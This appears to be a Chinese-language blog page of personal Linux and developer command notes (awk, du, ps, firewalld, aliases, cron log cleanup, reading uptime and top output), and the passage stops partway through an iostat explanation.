<h3 id="git-push-报错-fatal-HttpRequestException-encountered"><a href="#git-push-报错-fatal-HttpRequestException-encountered" class="headerlink" title="git push 报错 fatal: HttpRequestException encountered."></a>git push 报错 fatal: HttpRequestException encountered.</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Github 禁用了TLS v1<span class="number">.0</span> and v1<span class="number">.1</span>，必须更新Windows的git凭证管理器</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/Microsoft/Git-Credential-Manager-for-Windows/releases/tag/v1.18.2</span></span><br><span class="line"></span><br><span class="line">下载并安装后即可解决</span><br></pre></td></tr></table></figure>
<h3 id="pip-install-失败"><a href="#pip-install-失败" class="headerlink" title="pip install 失败"></a>pip install 失败</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> pip install myqr</span><br><span class="line">Collecting myqr</span><br><span class="line">  Retrying (Retry(total=<span class="number">4</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'ProxyError('</span>Cannot connect to proxy.<span class="string">', NewConnectionError('</span>&lt;pip._vendor.urllib3.connection.VerifiedHTTPSConnection object at <span class="number">0x03B22330</span>&gt;: Failed to establish a <span class="keyword">new</span> connection: [WinError <span class="number">10061</span>] 由于目</span><br><span class="line">标计算机积极拒绝，无法连接。<span class="string">'))'</span>: <span class="regexp">/simple/my</span>qr/</span><br><span class="line">打开Internet选项，选择连接–局域网设置  全部取消勾选，问题解决</span><br><span class="line">https:<span class="comment">//blog.csdn.net/u010784236/article/details/51820284</span></span><br></pre></td></tr></table></figure>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">'this is a test'</span> | awk <span class="string">'&#123;print $0&#125;'</span></span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123; print $1 &#125;'</span> demo.txt</span><br><span class="line">$(NF<span class="number">-1</span>) 代表倒数第二个字段。</span><br><span class="line"> </span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123;print $1, $(NF-1)&#125;'</span> demo.txt</span><br><span class="line"> NR 表示当前处理的是第几行。</span><br><span class="line"> </span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123;print NR ") " $1&#125;'</span> demo.txt</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'&#123; print toupper($1) &#125;'</span> demo.txt</span><br><span class="line">awk -F ':' '/usr/ &#123;print $1&#125;' demo.txt #awk ‘条件 动作’ 文件名  print 命令前面是一个正则表达式，只输出包含 usr 的行</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'NR % 2 == 1 &#123;print $1&#125;'</span> demo.txt 输出奇数行</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'&#123;if ($1 &gt; "m") print $1&#125;'</span> demo.txt</span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123;if ($1 &gt; "m") print $1; else print "---"&#125;'</span> demo.txt</span><br></pre></td></tr></table></figure>
<h3 id="批量删除-DS-Store-文件"><a href="#批量删除-DS-Store-文件" class="headerlink" title="批量删除 .DS_Store 文件"></a>批量删除 .DS_Store 文件</h3><p><code>find /home/path -name &quot;.DS_Store&quot; -type f -delete</code></p>
<h3 id="查看硬盘及内存空间"><a href="#查看硬盘及内存空间" class="headerlink" title="查看硬盘及内存空间"></a>查看硬盘及内存空间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"># 查看内存及swap大小</span><br><span class="line">free -m</span><br><span class="line"># 查看当前文件夹下所有文件大小（包括子文件夹）</span><br><span class="line">du -sh</span><br><span class="line"># 查看指定文件夹下所有文件大小</span><br><span class="line">du -h /tmp</span><br><span class="line"># 查看tmp目录(包含子目录)的大小</span><br><span class="line">du -ah /tmp</span><br><span class="line"></span><br><span class="line"># 查看指定文件夹大小</span><br><span class="line">du -hs ftp</span><br><span class="line"># 查看磁盘剩余空间</span><br><span class="line">df -hl</span><br><span class="line"># 查看每个根路径的分区大小</span><br><span class="line">df -h</span><br><span class="line"># 返回该目录的大小</span><br><span class="line">du -sh [目录名]</span><br><span class="line"># 返回该文件夹总M数</span><br><span class="line">du -sm [文件夹]</span><br></pre></td></tr></table></figure>
<h3 id="统计文件或目录的个数"><a href="#统计文件或目录的个数" class="headerlink" title="统计文件或目录的个数"></a>统计文件或目录的个数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 统计文件夹下文件的个数</span><br><span class="line">ls -l | grep <span class="string">'^-'</span> | wc -l</span><br><span class="line"># 统计文件夹下目录的个数</span><br><span class="line">ls -l | grep <span class="string">'^d'</span> | wc -l</span><br><span class="line"># 统计文件夹下文件的个数(包括子文件夹里的)</span><br><span class="line">ls -lR | grep <span class="string">'^-'</span> | wc -l</span><br><span class="line"># 统计文件夹下目录的个数(包括子文件夹里的)</span><br><span class="line">ls -lR | grep <span class="string">'^d'</span> | wc -l</span><br><span class="line"># 统计/var/www目录下的所有py文件</span><br><span class="line">ls -l /<span class="keyword">var</span>/www | grep py | wc -l</span><br><span class="line"># 统计/var/www目录下(包括子文件夹里的)的所有py文件</span><br><span class="line">ls -lR /<span class="keyword">var</span>/www | grep py | wc -l</span><br></pre></td></tr></table></figure>
<h3 id="查看CPU和内存占用"><a href="#查看CPU和内存占用" class="headerlink" title="查看CPU和内存占用"></a>查看CPU和内存占用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># CPU占用最多的前10个进程： </span><br><span class="line">ps auxw|head <span class="number">-1</span>;ps auxw|sort -rn -k3|head <span class="number">-10</span> </span><br><span class="line"># 内存消耗最多的前10个进程 </span><br><span class="line">ps auxw|head <span class="number">-1</span>;ps auxw|sort -rn -k4|head <span class="number">-10</span> </span><br><span class="line"># 虚拟内存使用最多的前10个进程 </span><br><span class="line">ps auxw|head <span class="number">-1</span>;ps auxw|sort -rn -k5|head <span class="number">-10</span></span><br><span class="line"> 按内存占用对进程排序</span><br><span class="line">ps auxw --sort=rss</span><br><span class="line"># 按CPU占用对进程排序</span><br><span class="line">ps auxw --sort=%cpu</span><br><span class="line"></span><br><span class="line">查看所有运行的进程</span><br><span class="line">ps -A</span><br></pre></td></tr></table></figure>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">强制指定本地端口</span><br><span class="line">curl --local-port <span class="number">51</span> http:<span class="comment">//web.example.com</span></span><br><span class="line"></span><br><span class="line"># 查看连接的详细信息</span><br><span class="line"># --trace-time 跟踪/详细输出时，添加时间戳</span><br><span class="line">curl -Sv --trace-time http:<span class="comment">//web.example.com</span></span><br></pre></td></tr></table></figure>
<h3 id="连接你服务器-top10-用户端的-IP-地址"><a href="#连接你服务器-top10-用户端的-IP-地址" class="headerlink" title="连接你服务器 top10 用户端的 IP 地址"></a>连接你服务器 top10 用户端的 IP 地址</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat | awk <span class="string">'&#123;print $5&#125;'</span> | awk -F <span class="string">':'</span> <span class="string">'&#123;print $1&#125;'</span> | sort | uniq -c | sort -rn | head -n <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h3 id="最常用的10个命令"><a href="#最常用的10个命令" class="headerlink" title="最常用的10个命令"></a>最常用的10个命令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history | sort | uniq -c | sort -rn | head -n <span class="number">10</span> (or cat .zhistory | sort | uniq -c | sort -rn | head -n <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h3 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alias nis=<span class="string">"npm install --save "</span></span><br><span class="line">alias svim=<span class="string">'sudo vim'</span></span><br><span class="line">alias mkcd=<span class="string">'foo()&#123; mkdir -p "$1"; cd "$1" &#125;; foo '</span></span><br><span class="line">alias install=<span class="string">'sudo apt get install'</span></span><br><span class="line">alias update=<span class="string">'sudo apt-get update; sudo apt-get upgrade'</span></span><br><span class="line">alias ..=<span class="string">"cd .."</span></span><br><span class="line">alias ...=<span class="string">"cd ..; cd .."</span></span><br><span class="line">alias www=<span class="string">'python -m SimpleHTTPServer 8000'</span></span><br><span class="line">alias sock5=<span class="string">'ssh -D 8080 -q -C -N -f user@your.server'</span></span><br></pre></td></tr></table></figure>
<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//www.openss7.org/repos/tarballs/strx25-0.9.2.1.ta</span></span><br><span class="line">$ wget -b http:<span class="comment">//www.openss7.org/repos/tarballs/strx25-0.9.2.1.tar.bz2</span></span><br><span class="line">Continuing <span class="keyword">in</span> background, pid <span class="number">1984.</span></span><br><span class="line">Output will be written to <span class="string">`wget-log'.</span></span><br><span class="line"><span class="string">wget -i download-file-list.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo firewall-cmd --zone=public --add-port=<span class="number">60001</span>/udp --permanent</span><br><span class="line">sudo firewall-cmd --reload</span><br><span class="line">#之后检查新的防火墙规则</span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"></span><br><span class="line"><span class="comment">//临时关闭防火墙,重启后会重新自动打开</span></span><br><span class="line">systemctl restart firewalld</span><br><span class="line"><span class="comment">//检查防火墙状态</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"><span class="comment">//Disable firewall</span></span><br><span class="line">systemctl disable firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl status firewalld</span><br><span class="line"><span class="comment">//Enable firewall</span></span><br><span class="line">systemctl enable firewalld</span><br><span class="line">systemctl start firewalld</span><br><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>
<h3 id="显示-Path-环境变量"><a href="#显示-Path-环境变量" class="headerlink" title="显示 Path 环境变量"></a>显示 Path 环境变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> $ echo $PATH | tr : \\n</span><br><span class="line">/data2/node-v6<span class="number">.11</span><span class="number">.0</span>-linux-x64<span class="comment">//bin</span></span><br><span class="line">/usr/bin</span><br><span class="line">/bin</span><br><span class="line">/usr/sbin</span><br><span class="line">/sbin</span><br><span class="line">/usr/local/bin</span><br><span class="line">/usr/local/sbin</span><br><span class="line">/data0/opt/python27/bin</span><br></pre></td></tr></table></figure>
<h3 id="判断字符串包含"><a href="#判断字符串包含" class="headerlink" title="判断字符串包含"></a>判断字符串包含</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ $tar =~ tar.gz ]];then echo <span class="string">"包含"</span>;fi</span><br></pre></td></tr></table></figure>
<h3 id="快速修改后缀名字"><a href="#快速修改后缀名字" class="headerlink" title="快速修改后缀名字"></a>快速修改后缀名字</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ll</span><br><span class="line">CentOS-base.repo.repo.bak</span><br><span class="line">epel.repo.repo.bak</span><br><span class="line"></span><br><span class="line">ls *.bak|awk -F. <span class="string">'&#123;print $1&#125;'</span>|xargs -t -i mv &#123;&#125;.repo.repo.bak &#123;&#125;.repo</span><br></pre></td></tr></table></figure>
<h3 id="数值排序"><a href="#数值排序" class="headerlink" title="数值排序"></a>数值排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort -t <span class="string">":"</span> -k <span class="number">3</span> -n /etc/passwd</span><br></pre></td></tr></table></figure>
<h3 id="清理httpd服务日志超过3天的内容"><a href="#清理httpd服务日志超过3天的内容" class="headerlink" title="清理httpd服务日志超过3天的内容"></a>清理httpd服务日志超过3天的内容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">5</span> * * * <span class="regexp">/usr/</span>bin/find /<span class="keyword">var</span>/log/httpd/ -type f -mtime +<span class="number">3</span> -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h3 id="awk获取json"><a href="#awk获取json" class="headerlink" title="awk获取json"></a>awk获取json</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>: <span class="string">"michael"</span>, <span class="string">"sex"</span>: <span class="string">"male"</span>, <span class="string">"pkg_url"</span>: <span class="string">"www.github.com"</span>, <span class="string">"number"</span>: <span class="string">"888"</span>&#125;</span><br><span class="line"></span><br><span class="line">pkg_url=$(echo $env | awk -F <span class="string">"pkg_url\": \""</span> <span class="string">'&#123;print $2&#125;'</span> | awk -F <span class="string">"\","</span> <span class="string">'&#123;print $1&#125;'</span>)</span><br><span class="line">echo $pkg_url</span><br><span class="line">www.github.com</span><br></pre></td></tr></table></figure>
<h3 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查看 CPU 的型号</span><br><span class="line"></span><br><span class="line"> cat /proc/cpuinfo | grep <span class="string">'model name'</span> | sort | uniq</span><br><span class="line">查看 CPU 颗数</span><br><span class="line"></span><br><span class="line">实际 Server 中插槽上的 CPU 个数，物理 cpu 数量，可以数不重复的 physical id 个数。</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo | grep <span class="string">'physical id'</span> | sort | uniq | wc -l</span><br><span class="line">查看 CPU 核数</span><br><span class="line"></span><br><span class="line">一颗 CPU 上面能处理数据的芯片组的数量。</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo |grep <span class="string">"cores"</span>|uniq|awk <span class="string">'&#123;print $4&#125;'</span></span><br><span class="line">top 命令查询出来的就是逻辑 CPU 的数量。</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo |grep <span class="string">"processor"</span>|wc -l</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32681</span></span><br></pre></td></tr></table></figure>
<h3 id="查看系统负载"><a href="#查看系统负载" class="headerlink" title="查看系统负载"></a>查看系统负载</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">$ uptime\</span><br><span class="line"><span class="number">16</span>:<span class="number">33</span>:<span class="number">56</span> up <span class="number">69</span> days,  <span class="number">5</span>:<span class="number">10</span>,  <span class="number">1</span> user,  load average: <span class="number">0.14</span>, <span class="number">0.24</span>, <span class="number">0.29</span></span><br><span class="line">以上信息的解析如下：</span><br><span class="line"></span><br><span class="line"><span class="number">16</span>:<span class="number">33</span>:<span class="number">56</span> : 当前时间</span><br><span class="line">up <span class="number">69</span> days, <span class="number">5</span>:<span class="number">10</span> : 系统运行了 <span class="number">69</span> 天 <span class="number">5</span> 小时 <span class="number">10</span> 分</span><br><span class="line"><span class="number">1</span> user : 当前有 <span class="number">1</span> 个用户登录了系统 load average: <span class="number">0.14</span>, <span class="number">0.24</span>, <span class="number">0.29</span> : 系统在过去 <span class="number">1</span> 分钟内，<span class="number">5</span> 分钟内，<span class="number">15</span> 分钟内的平均负载</span><br><span class="line">load average: <span class="number">0.14</span>, <span class="number">0.24</span>, <span class="number">0.29</span> : 系统在过去 <span class="number">1</span> 分钟内，<span class="number">5</span> 分钟内，<span class="number">15</span> 分钟内的平均负载</span><br><span class="line">平均负载解析</span><br><span class="line"></span><br><span class="line">查看逻辑 CPU 核心数：</span><br><span class="line"></span><br><span class="line">$ grep <span class="string">'model name'</span> /proc/cpuinfo | wc -l\</span><br><span class="line"><span class="number">1</span>\</span><br><span class="line">运行结果表示，有 <span class="number">1</span> 个逻辑 CPU 核心。以 <span class="number">1</span> 个 CPU 核心为例，假设 CPU 每分钟最多处理 <span class="number">100</span> 个进程 –</span><br><span class="line"></span><br><span class="line">load=<span class="number">0</span>，没有进程需要 CPU</span><br><span class="line">load=<span class="number">0.5</span>，CPU 处理了 <span class="number">50</span> 个进程</span><br><span class="line">load=<span class="number">1</span>, CPU 处理了 <span class="number">100</span> 个进程，这时 CPU 已被占满，但系统还是能顺畅运作的</span><br><span class="line">load=<span class="number">1.5</span>, CPU 处理了 <span class="number">100</span> 个进程，还有 <span class="number">50</span> 个进程正在排除等着 CPU 处理，这时，CPU 已经超负荷工作了</span><br><span class="line">为了系统顺畅运行，load 值最好不要超过 <span class="number">1.0</span>，这样就没有进程需要等待了，所有进程都能第一时间得到处理。\</span><br><span class="line">很显然，<span class="number">1.0</span> 是一个关键值，超过这个值，系统就不在最佳状态了。 一般 <span class="number">0.7</span> 是一个比较理想的值。\</span><br><span class="line">另外，load 值的健康状态还跟系统 CPU 核心数相关，如果 CPU 核心数为 <span class="number">2</span>，那么 load 值健康值应该为 <span class="number">2</span>，以此类推。 \</span><br><span class="line">评价系统的负载一般采用 <span class="number">15</span> 分钟内的那个平均负载值。</span><br><span class="line"></span><br><span class="line">二、w 命令</span><br><span class="line"></span><br><span class="line">$ w\</span><br><span class="line"> <span class="number">17</span>:<span class="number">47</span>:<span class="number">40</span> up <span class="number">69</span> days,  <span class="number">6</span>:<span class="number">24</span>,  <span class="number">1</span> user,  load average: <span class="number">0.46</span>, <span class="number">0.26</span>, <span class="number">0.25</span>\</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\</span><br><span class="line">lvinkim  pts/<span class="number">0</span>    <span class="number">14.18</span><span class="number">.144</span><span class="number">.2</span>      <span class="number">15</span>:<span class="number">55</span>    <span class="number">0.00</span>s  <span class="number">0.02</span>s  <span class="number">0.00</span>s w</span><br><span class="line">第 <span class="number">1</span> 行：与 uptime 一相同。 \</span><br><span class="line">第 <span class="number">2</span> 行以下，当前登录用户的列表。</span><br><span class="line"></span><br><span class="line">三、top 命令</span><br><span class="line"></span><br><span class="line">$ top\</span><br><span class="line">top - <span class="number">17</span>:<span class="number">51</span>:<span class="number">23</span> up <span class="number">69</span> days,  <span class="number">6</span>:<span class="number">28</span>,  <span class="number">1</span> user,  load average: <span class="number">0.31</span>, <span class="number">0.30</span>, <span class="number">0.26</span>\</span><br><span class="line">Tasks:  <span class="number">99</span> total,   <span class="number">1</span> running,  <span class="number">98</span> sleeping,   <span class="number">0</span> stopped,   <span class="number">0</span> zombie\</span><br><span class="line">Cpu(s):  <span class="number">2.3</span>%us,  <span class="number">0.2</span>%sy,  <span class="number">0.0</span>%ni, <span class="number">97.4</span>%id,  <span class="number">0.0</span>%wa,  <span class="number">0.0</span>%hi,  <span class="number">0.0</span>%si,  <span class="number">0.0</span>%st\</span><br><span class="line">Mem:   <span class="number">1922244</span>k total,  <span class="number">1737480</span>k used,   <span class="number">184764</span>k free,   <span class="number">208576</span>k buffers\</span><br><span class="line">Swap:        <span class="number">0</span>k total,        <span class="number">0</span>k used,        <span class="number">0</span>k free,   <span class="number">466732</span>k cached\</span><br><span class="line">\</span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                \</span><br><span class="line">    <span class="number">1</span> root      <span class="number">20</span>   <span class="number">0</span> <span class="number">19232</span> <span class="number">1004</span>  <span class="number">708</span> S  <span class="number">0.0</span>  <span class="number">0.1</span>   <span class="number">0</span>:<span class="number">01.17</span> init                                                                    \</span><br><span class="line">    <span class="number">2</span> root      <span class="number">20</span>   <span class="number">0</span>     <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> S  <span class="number">0.0</span>  <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.01</span> kthreadd                                                                \</span><br><span class="line">...</span><br><span class="line">第 <span class="number">1</span> 行：与 uptime 一相同。</span><br><span class="line"></span><br><span class="line">第 <span class="number">2</span> 行：进程数信息。</span><br><span class="line"></span><br><span class="line">Tasks: <span class="number">99</span> total : 总共有 <span class="number">99</span> 个进程</span><br><span class="line"><span class="number">1</span> running : <span class="number">1</span> 个进程正在占用 CPU</span><br><span class="line"><span class="number">98</span> sleeping : <span class="number">98</span> 个睡眠进程</span><br><span class="line"><span class="number">0</span> stopped : <span class="number">0</span> 个停止的进程</span><br><span class="line"><span class="number">0</span> zombie : <span class="number">0</span> 个僵尸进程</span><br><span class="line">第 <span class="number">3</span> 行 : CPU 使用率</span><br><span class="line"></span><br><span class="line">us (user): 非 nice 用户进程占用 CPU 的比率</span><br><span class="line">sy (system): 内核、内核进程占用 CPU 的比率</span><br><span class="line">ni (nice): 用户进程空间内改变过优先级的进程占用 CPU 比率</span><br><span class="line">id (idle): CPU 空闲比率，如果系统缓慢而这个值很高，说明系统慢的原因不是 CPU 负载高</span><br><span class="line">wa (iowait): CPU 等待执行 I/O 操作的时间比率，该指标可以用来排查磁盘 I/O 的问题，通常结合 wa 和 id 判断</span><br><span class="line">hi (Hardware IRQ): CPU 处理硬件中断所占时间的比率</span><br><span class="line">si (Software Interrupts): CPU 处理软件中断所占时间的比率</span><br><span class="line">st (steal): 流逝的时间，虚拟机中的其他任务所占 CPU 时间的比率</span><br><span class="line">需要注意的一些情形：</span><br><span class="line"></span><br><span class="line">用户进程 us 占比高，I/O 操作 wa 低：说明系统缓慢的原因在于进程占用大量 CPU，通常还会伴有教低的空闲比率 id，说明 CPU 空转时间很少。</span><br><span class="line">I/O 操作 wa 低，空闲比率 id 高：可以排除 CPU 资源瓶颈的可能。</span><br><span class="line">I/O 操作 wa 高：说明 I/O 占用了大量的 CPU 时间，需要检查交换空间的使用，交换空间位于磁盘上，性能远低于内存，当内存耗尽开始使用交换空间时，将会给性能带来严重影响，所以对于性能要求较高的服务器，一般建议关闭交换空间。另一方面，如果内存充足，但 wa 很高，说明需要检查哪个进程占用了大量的 I/O 资源。</span><br><span class="line">更多负载情形，可在实际中灵活判断。</span><br><span class="line"></span><br><span class="line">四、iostat 命令</span><br><span class="line"></span><br><span class="line">iostat 命令可以查看系统分区的 IO 使用情况</span><br><span class="line"></span><br><span class="line">$ iostat \</span><br><span class="line">Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-573.22</span><span class="number">.1</span>.el6.x86_64 (sgs02)   <span class="number">01</span>/<span class="number">20</span>/<span class="number">2017</span>     _x86_64_   (<span class="number">1</span> CPU)\</span><br><span class="line">\</span><br><span class="line">avg-cpu:  %user   %nice %system %iowait  %steal   %idle\</span><br><span class="line">           <span class="number">2.29</span>    <span class="number">0.00</span>    <span class="number">0.25</span>    <span class="number">0.04</span>    <span class="number">0.00</span>   <span class="number">97.41</span>\</span><br><span class="line">\</span><br><span class="line">Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn\</span><br><span class="line">vda               <span class="number">1.15</span>         <span class="number">3.48</span>        <span class="number">21.88</span>   <span class="number">21016084</span>  <span class="number">131997520</span></span><br><span class="line">一些值得注意的 IO 指标 